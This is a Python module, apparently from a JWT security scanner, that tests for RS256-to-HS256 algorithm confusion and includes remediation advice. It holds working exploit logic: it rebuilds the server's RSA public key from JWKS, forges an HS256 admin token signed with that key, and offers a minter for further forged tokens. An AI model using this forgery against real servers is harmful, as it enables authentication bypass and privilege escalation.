"""P3: RS256 -> HS256 algorithm confusion.

Fetches the server's RSA public key from its JWKS endpoint, reconstructs the PEM,
and signs an HS256 token using that PEM as the HMAC secret. A server that fails to
pin the algorithm verifies the attacker-signed token as if it were legitimate.
CONFIRMS only on HTTP 200 + escalation.
"""

from __future__ import annotations

import base64
from typing import Any, Optional

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers

from ..client import AuthClient, Baseline
from ..forge import pubkey_as_hmac_token
from ..models import Evidence, Finding, ForgeCapability, Severity, Target, Verdict
from .base import Probe, register

_JWKS_PATH = "/.well-known/jwks.json"
_ADMIN_CLAIMS: dict[str, Any] = {"sub": "alice", "username": "alice", "role": "admin"}


def _b64url_to_int(segment: str) -> int:
    padded = segment + "=" * (-len(segment) % 4)
    return int.from_bytes(base64.urlsafe_b64decode(padded), "big")


def _jwks_to_pem(jwk: dict[str, Any]) -> str:
    """Reconstruct an RSA public-key PEM (SubjectPublicKeyInfo) from a JWK."""
    n = _b64url_to_int(jwk["n"])
    e = _b64url_to_int(jwk["e"])
    public_key = RSAPublicNumbers(e=e, n=n).public_key()
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return pem.decode("ascii")


class AlgConfusionProbe(Probe):
    id = "alg_confusion"
    title = "RS256->HS256 algorithm confusion"
    severity = Severity.CRITICAL
    cwe = "CWE-347"
    remediation = (
        "Pin the verification algorithm explicitly (verify with algorithms=['RS256']) "
        "and never accept HS256 on an RSA-keyed server, so the public key can never be "
        "used as an HMAC secret."
    )

    def __init__(self) -> None:
        self._pem: Optional[str] = None

    def run(
        self,
        client: AuthClient,
        target: Target,
        baseline: Baseline,
        capability: ForgeCapability,
    ) -> Finding:
        request_line = f"GET {target.admin_path}"

        pem = self._fetch_public_key_pem(client)
        if pem is None:
            evidence = Evidence(
                forged_token=None,
                request_line=f"GET {_JWKS_PATH}",
                status_code=None,
                response_snippet="",
                note="no RSA public key discoverable via JWKS; confusion not applicable",
            )
            return self._finding(Verdict.NOT_VULNERABLE, evidence)

        self._pem = pem
        forged = pubkey_as_hmac_token(_ADMIN_CLAIMS, pem)
        resp = client.get(target.admin_path, forged)
        snippet = resp.text[:200]

        if client.is_escalated(resp, baseline):
            evidence = Evidence(
                forged_token=forged,
                request_line=request_line,
                status_code=resp.status_code,
                response_snippet=snippet,
                note="RSA public key used as HMAC secret; HS256-forged admin token accepted",
            )
            return self._finding(Verdict.CONFIRMED, evidence)

        evidence = Evidence(
            forged_token=forged,
            request_line=request_line,
            status_code=resp.status_code,
            response_snippet=snippet,
            note="HS256 token signed with the public key was rejected",
        )
        return self._finding(Verdict.NOT_VULNERABLE, evidence)

    def _fetch_public_key_pem(self, client: AuthClient) -> Optional[str]:
        try:
            resp = client.get(_JWKS_PATH, None)
        except Exception:  # noqa: BLE001 - connectivity failure => not applicable
            return None
        if resp.status_code != 200:
            return None
        try:
            keys = resp.json().get("keys", [])
        except ValueError:
            return None
        for jwk in keys:
            if jwk.get("kty") == "RSA" and "n" in jwk and "e" in jwk:
                try:
                    return _jwks_to_pem(jwk)
                except (KeyError, ValueError, TypeError):
                    continue
        return None

    def _finding(self, verdict: Verdict, evidence: Evidence) -> Finding:
        return Finding(
            probe_id=self.id,
            title=self.title,
            verdict=verdict,
            severity=self.severity,
            cwe=self.cwe,
            evidence=evidence,
            remediation=self.remediation,
        )

    def forge_capability(self) -> Optional[ForgeCapability]:
        if self._pem is None:
            return None
        pem = self._pem

        def mint(claims: dict[str, Any]) -> str:
            payload: dict[str, Any] = {"sub": "alice", "username": "alice"}
            payload.update(claims)
            return pubkey_as_hmac_token(payload, pem)

        return ForgeCapability(
            gained=True,
            method="rs256->hs256-confusion",
            detail="RSA public key used as HMAC secret",
            mint=mint,
        )


register(AlgConfusionProbe())
